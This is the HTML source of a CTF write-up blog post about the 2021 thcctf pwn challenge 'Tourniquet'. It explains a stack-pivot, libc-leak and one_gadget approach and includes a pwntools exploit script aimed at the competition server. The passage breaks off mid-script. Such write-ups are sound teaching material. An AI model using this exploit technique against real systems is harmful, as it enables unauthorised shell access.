@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
+    <meta charset="UTF-8" />
+
+    <meta name="generator" content="Hugo 0.68.3" /><meta name="theme-color" content="#16171d" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
+    
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+
+    <title>thcctf pwn-rev write-up | Ainset.in</title>
+
+    <link rel="stylesheet" href="/css/meme.min.c839b5e2caae418da2fd6ad447b662c1af1ea116def758fdc659bc80ab9d53d7.css"/>
+
+    
+    
+        <script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/js/meme.min.f20809e0ee5cf81fb78fc1af7858a307f8306aa5f99ab4757739e4b09df980ce.js"></script>
+
+    
+
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM&#43;Plex&#43;Serif:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;family=Comfortaa:wght@700&amp;display=swap&amp;family=Lato:wght@100;400&amp;display=swap&amp;family=Roboto&#43;Mono:wght@200;400&amp;display=swap" media="print" onload="this.media='all'" />
+        <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM&#43;Plex&#43;Serif:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;family=Comfortaa:wght@700&amp;display=swap&amp;family=Lato:wght@100;400&amp;display=swap&amp;family=Roboto&#43;Mono:wght@200;400&amp;display=swap" /></noscript>
+
+    <meta name="author" content="Ainsetin" /><meta name="description" content="Tasks  Pwn  Tourniquet (249pts)   Rev  Mission Impossible (246pts)     Tourniquet (Pwn, 249pts) This is stack pivot problem without overwriting RET. First, our team planned to input more than 0x48 bytes to overwrite RET.
+But, it has a constraint:" />
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="#2a6df4" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-title" content="Ainset.in" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <meta name="application-name" content="Ainset.in" />
+    <meta name="msapplication-starturl" content="../../" />
+    <meta name="msapplication-TileColor" content="#fff" />
+    <meta name="msapplication-TileImage" content="../../icons/mstile-150x150.png" />
+    <link rel="manifest" href="/manifest.json" />
+
+    
+    
+
+    
+    <link rel="canonical" href="https://ainset.in/posts/thcctf_2021_pwn_rev/" />
+    
+
+<script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "datePublished": "2021-06-14T22:41:00+09:00",
+        "dateModified": "2021-06-14T23:11:35+09:00",
+        "url": "https://ainset.in/posts/thcctf_2021_pwn_rev/",
+        "headline": "thcctf pwn-rev write-up",
+        "description": "Tasks  Pwn  Tourniquet (249pts)   Rev  Mission Impossible (246pts)     Tourniquet (Pwn, 249pts) This is stack pivot problem without overwriting RET. First, our team planned to input more than 0x48 bytes to overwrite RET.\nBut, it has a constraint:",
+        "inLanguage" : "en",
+        "articleSection": "posts",
+        "wordCount":  811 ,
+        "image": ["https://ainset.in/img/2021-thcctf/1.png","https://ainset.in/img/2021-thcctf/2.png"],
+        "author": {
+            "@type": "Person",
+            "description": "Try To be The Expert",
+            "email": "bww9641@naver.com",
+            "image": "https://ainset.in/icons/apple-touch-icon.png",
+            "url": "https://github.com/bww9641",
+            "name": "Ainsetin"
+        },
+        "license": "[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)",
+        "publisher": {
+            "@type": "Organization",
+            "name": "Ainset.in",
+            "logo": {
+                "@type": "ImageObject",
+                "url": "https://ainset.in/icons/logo_black.jpg"
+            },
+            "url": "https://ainset.in/"
+        },
+        "mainEntityOfPage": {
+            "@type": "WebSite",
+            "@id": "https://ainset.in/"
+        }
+    }
+</script>
+
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+
+
+<meta name="twitter:site" content="@bww9641" />
+<meta name="twitter:creator" content="@bww9641" />
+
+    
+
+
+
+<meta property="og:title" content="thcctf pwn-rev write-up" />
+<meta property="og:description" content="Tasks  Pwn  Tourniquet (249pts)   Rev  Mission Impossible (246pts)     Tourniquet (Pwn, 249pts) This is stack pivot problem without overwriting RET. First, our team planned to input more than 0x48 bytes to overwrite RET.
+But, it has a constraint:" />
+<meta property="og:url" content="https://ainset.in/posts/thcctf_2021_pwn_rev/" />
+<meta property="og:site_name" content="Ainset.in" />
+<meta property="og:locale" content="en" /><meta property="og:image" content="https://ainset.in/img/2021-thcctf/1.png" />
+<meta property="og:type" content="article" />
+    <meta property="article:published_time" content="2021-06-14T22:41:00&#43;09:00" />
+    <meta property="article:modified_time" content="2021-06-14T23:11:35&#43;09:00" />
+    
+    <meta property="article:section" content="posts" />
+
+
+
+    
+    
+
+    
+</head>
+
+    <body>
+        <div class="container">
+            
+    <header class="header">
+        
+            <div class="header-wrapper">
+                <div class="header-inner single">
+                    
+    <div class="site-brand">
+        
+            <a href="/" class="brand">Ainset.in</a>
+        
+    </div>
+
+                    <nav class="nav">
+    <ul class="menu" id="menu">
+        
+            
+        
+        
+        
+        
+            
+                <li class="menu-item"><a href="/posts/"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon archive"><path d="M32 448c0 17.7 14.3 32 32 32h384c17.7 0 32-14.3 32-32V160H32v288zm160-212c0-6.6 5.4-12 12-12h104c6.6 0 12 5.4 12 12v8c0 6.6-5.4 12-12 12H204c-6.6 0-12-5.4-12-12v-8zM480 32H32C14.3 32 0 46.3 0 64v48c0 8.8 7.2 16 16 16h480c8.8 0 16-7.2 16-16V64c0-17.7-14.3-32-32-32z"/></svg><span class="menu-item-name">Posts</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/categories/"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon th"><path d="M149.333 56v80c0 13.255-10.745 24-24 24H24c-13.255 0-24-10.745-24-24V56c0-13.255 10.745-24 24-24h101.333c13.255 0 24 10.745 24 24zm181.334 240v-80c0-13.255-10.745-24-24-24H205.333c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24h101.333c13.256 0 24.001-10.745 24.001-24zm32-240v80c0 13.255 10.745 24 24 24H488c13.255 0 24-10.745 24-24V56c0-13.255-10.745-24-24-24H386.667c-13.255 0-24 10.745-24 24zm-32 80V56c0-13.255-10.745-24-24-24H205.333c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24h101.333c13.256 0 24.001-10.745 24.001-24zm-205.334 56H24c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24h101.333c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24zM0 376v80c0 13.255 10.745 24 24 24h101.333c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24H24c-13.255 0-24 10.745-24 24zm386.667-56H488c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24H386.667c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24zm0 160H488c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24H386.667c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24zM181.333 376v80c0 13.255 10.745 24 24 24h101.333c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24H205.333c-13.255 0-24 10.745-24 24z"/></svg><span class="menu-item-name">Categories</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/tags/"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512" class="icon tags"><path d="M497.941 225.941L286.059 14.059A48 48 0 0 0 252.118 0H48C21.49 0 0 21.49 0 48v204.118a48 48 0 0 0 14.059 33.941l211.882 211.882c18.744 18.745 49.136 18.746 67.882 0l204.118-204.118c18.745-18.745 18.745-49.137 0-67.882zM112 160c-26.51 0-48-21.49-48-48s21.49-48 48-48 48 21.49 48 48-21.49 48-48 48zm513.941 133.823L421.823 497.941c-18.745 18.745-49.137 18.745-67.882 0l-.36-.36L527.64 323.522c16.999-16.999 26.36-39.6 26.36-63.64s-9.362-46.641-26.36-63.64L331.397 0h48.721a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882z"/></svg><span class="menu-item-name">Tags</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/about/"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" class="icon user-circle"><path d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm0 96c48.6 0 88 39.4 88 88s-39.4 88-88 88-88-39.4-88-88 39.4-88 88-88zm0 344c-58.7 0-111.3-26.6-146.5-68.2 18.8-35.4 55.6-59.8 98.5-59.8 2.4 0 4.8.4 7.1 1.1 13 4.2 26.6 6.9 40.9 6.9 14.3 0 28-2.7 40.9-6.9 2.3-.7 4.7-1.1 7.1-1.1 42.9 0 79.7 24.4 98.5 59.8C359.3 421.4 306.7 448 248 448z"/></svg><span class="menu-item-name">About</span></a>
+                </li>
+            
+        
+            
+                
+                    
+                    
+                        <li class="menu-item">
+                            <a id="theme-switcher" href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon theme-icon-light"><path d="M193.2 104.5l48.8-97.5a18 18 0 0128 0l48.8 97.5 103.4 -34.5a18 18 0 0119.8 19.8l-34.5 103.4l97.5 48.8a18 18 0 010 28l-97.5 48.8 34.5 103.4a18 18 0 01-19.8 19.8l-103.4-34.5-48.8 97.5a18 18 0 01-28 0l-48.8-97.5l-103.4 34.5a18 18 0 01-19.8-19.8l34.5-103.4-97.5-48.8a18 18 0 010-28l97.5-48.8-34.5-103.4a18 18 0 0119.8-19.8zM256 128a128 128 0 10.01 0M256 160a96 96 0 10.01 0"/></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon theme-icon-dark"><path d="M27 412a256 256 0 10154-407a11.5 11.5 0 00-5 20a201.5 201.5 0 01-134 374a11.5 11.5 0 00-15 13"/></svg></a>
+                        </li>
+                    
+                
+            
+        
+            
+                
+            
+        
+            
+                <li class="menu-item search-item">
+                        <form id="search" class="search" role="search">
+    <label for="search-input"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon search-icon"><path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></label>
+    <input type="search" id="search-input" class="search-input">
+</form>
+
+<template id="search-result" hidden>
+    <article class="content post">
+        <h2 class="post-title"><a class="summary-title-link"></a></h2>
+        <summary class="summary"></summary>
+        <div class="read-more-container">
+            <a class="read-more-link">Read More »</a>
+        </div>
+    </article>
+</template>
+
+                    </li>
+                
+            
+        
+    </ul>
+</nav>
+
+                    
+                </div>
+            </div>
+            
+    <input type="checkbox" id="nav-toggle" aria-hidden="true" />
+    <label for="nav-toggle" class="nav-toggle"></label>
+    <label for="nav-toggle" class="nav-curtain"></label>
+
+
+        
+    </header>
+
+
+
+
+            
+            
+    <main class="main single" id="main">
+    <div class="main-inner">
+
+        
+
+        <article class="content post h-entry" data-small-caps="true" data-align="default" data-type="posts" data-toc-num="true">
+
+            <h1 class="post-title p-name">thcctf pwn-rev write-up</h1>
+
+            
+
+            
+                
+            
+
+            
+                
+
+<div class="post-meta">
+    
+        
+        <time datetime="2021-06-14T22:41:00&#43;09:00" class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M148 288h-40c-6.6 0-12-5.4-12-12v-40c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12zm108-12v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm96 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm-96 96v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm-96 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm192 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm96-260v352c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V112c0-26.5 21.5-48 48-48h48V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h128V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h48c26.5 0 48 21.5 48 48zm-48 346V160H48v298c0 3.3 2.7 6 6 6h340c3.3 0 6-2.7 6-6z"/></svg>&nbsp;2021.6.14</time>
+    
+    
+        
+        <time datetime="2021-06-14T23:11:35&#43;09:00" class="post-meta-item modified dt-updated"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2021.6.14</time>
+    
+    
+    
+        
+        
+        
+            
+                <span class="post-meta-item category"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M464 128H272l-54.63-54.63c-6-6-14.14-9.37-22.63-9.37H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V176c0-26.51-21.49-48-48-48zm0 272H48V112h140.12l54.63 54.63c6 6 14.14 9.37 22.63 9.37H464v224z"/></svg>&nbsp;<a href="/categories/pwn/" class="category-link p-category">pwn</a>/<a href="/categories/ctf/" class="category-link p-category">ctf</a></span>
+            
+        
+    
+    
+        
+        <span class="post-meta-item wordcount"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3 0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9 0l60.1 60.1c18.8 18.7 18.8 49.1 0 67.9zM284.2 99.8L21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3 0-17l-111-111c-4.8-4.7-12.4-4.7-17.1 0zM124.1 339.9c-5.5-5.5-5.5-14.3 0-19.8l154-154c5.5-5.5 14.3-5.5 19.8 0s5.5 14.3 0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8 0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg>&nbsp;811</span>
+    
+    
+        
+        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;4&nbsp;mins</span>
+    
+    
+    
+</div>
+
+            
+
+            <div class="post-body e-content">
+              <h3 id="tasks"><a href="#tasks" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>Tasks</h3>
+<ul>
+<li>Pwn
+<ul>
+<li>Tourniquet (249pts)</li>
+</ul>
+</li>
+<li>Rev
+<ul>
+<li>Mission Impossible (246pts)</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h4 id="tourniquet-pwn-249pts"><a href="#tourniquet-pwn-249pts" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>Tourniquet (Pwn, 249pts)</h4>
+<p><img src="/img/2021-thcctf/1.png" alt="1.png">
+<img src="/img/2021-thcctf/2.png" alt="2.png">
+This is stack pivot problem without overwriting RET. First, our team planned to input more than <code>0x48</code> bytes to overwrite RET.</p>
+<p>But, it has a constraint:</p>
+<ul>
+<li><code>fgets(size, buf, stdin)</code> set arguments from stdin to size.. so I can&rsquo;t call containing <code>stdin</code>.</li>
+<li>Should bruteforce(1/16) to get correct stack pointer.</li>
+<li>Must do <code>stack pivot</code> until I find a writable memory after leaking <code>libc</code>.</li>
+</ul>
+<p>So, I just DO STACK PIVOT 3 times, and find ONE 8byte memory.</p>
+<p>The following process is my idea to get shell..</p>
+<ol>
+<li>Overwrite one byte of SFP to <code>\x00</code> using fgets() function&rsquo;s <code>\n + \x00</code>.</li>
+<li>Bruteforce correct position of RBP. and ROP with puts to get libc.</li>
+<li>stack pivot to main(mov rbp, rsp) twice (my solution in competition).<br>
+(※ To go <code>__start</code> is another solution to get many memories that I can use for next ROP.)</li>
+<li>find one_gadget with <code>strings</code> and <code>objdump</code> command because <code>gem one_gadget</code> could&rsquo;t get shell on remote.</li>
+<li>Get Shell.</li>
+</ol>
+<p>Here is my payload.</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-py" data-lang="py"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+<span class="c1">#context.terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]</span>
+<span class="n">e</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./tourniquet&#34;</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
+<span class="c1">#libc=e.libc</span>
+<span class="n">pRdi</span><span class="o">=</span><span class="mh">0x00000000004006d3</span>
+<span class="n">pRsi_r15</span><span class="o">=</span><span class="mh">0x00000000004006d1</span>
+<span class="n">main</span><span class="o">=</span><span class="n">e</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
+<span class="n">puts_got</span><span class="o">=</span><span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="n">puts_plt</span><span class="o">=</span><span class="n">e</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="n">setvbuf_got</span><span class="o">=</span><span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;setvbuf&#39;</span><span class="p">]</span>
+<span class="n">rdx_offset</span><span class="o">=</span><span class="mh">0x0000000000001b92</span>
+<span class="n">pppr</span><span class="o">=</span><span class="mh">0x00000000004006cc</span>
+<span class="n">bss</span><span class="o">=</span><span class="mh">0x601100</span>
+<span class="n">fgets</span><span class="o">=</span><span class="n">e</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;fgets&#39;</span><span class="p">]</span>
+
+<span class="n">pay</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x601100</span><span class="o">+</span><span class="mh">0x40</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pRdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">setvbuf_got</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400627</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x601100</span><span class="o">+</span><span class="mh">0x40</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400627</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">7</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+  <span class="k">try</span><span class="p">:</span>
+    <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&#34;remote2.thcon.party&#34;</span><span class="p">,</span> <span class="mi">10901</span><span class="p">)</span>
+    <span class="c1">#p=process(&#34;./tourniquet&#34;)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;haha i&#39;m unhackable right ?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">pay</span><span class="p">)</span>
+    <span class="n">leak</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">leak</span><span class="p">:</span>
+      <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+      <span class="k">continue</span>
+    <span class="n">base</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;setvbuf&#39;</span><span class="p">]</span>
+    <span class="n">rdx</span><span class="o">=</span><span class="n">base</span><span class="o">+</span><span class="n">rdx_offset</span>
+    <span class="n">stdin</span><span class="o">=</span><span class="n">base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdin_&#39;</span><span class="p">]</span>
+    <span class="n">one_gadget</span><span class="o">=</span><span class="n">base</span><span class="o">+</span><span class="mh">0xe5418</span>
+    <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="p">)</span>
+    <span class="k">break</span>
+    <span class="c1">#pay=p64(0x4004c6)*2+p64(07+............x00000000004004c6)+p64(pRdi)+p64(setvbuf_got)+p64(puts_plt)+p64(main)+&#34;A&#34;*7</span>
+  <span class="k">except</span><span class="p">:</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">continue</span>
+
+<span class="n">pause</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;1234&#34;</span><span class="p">)</span>
+
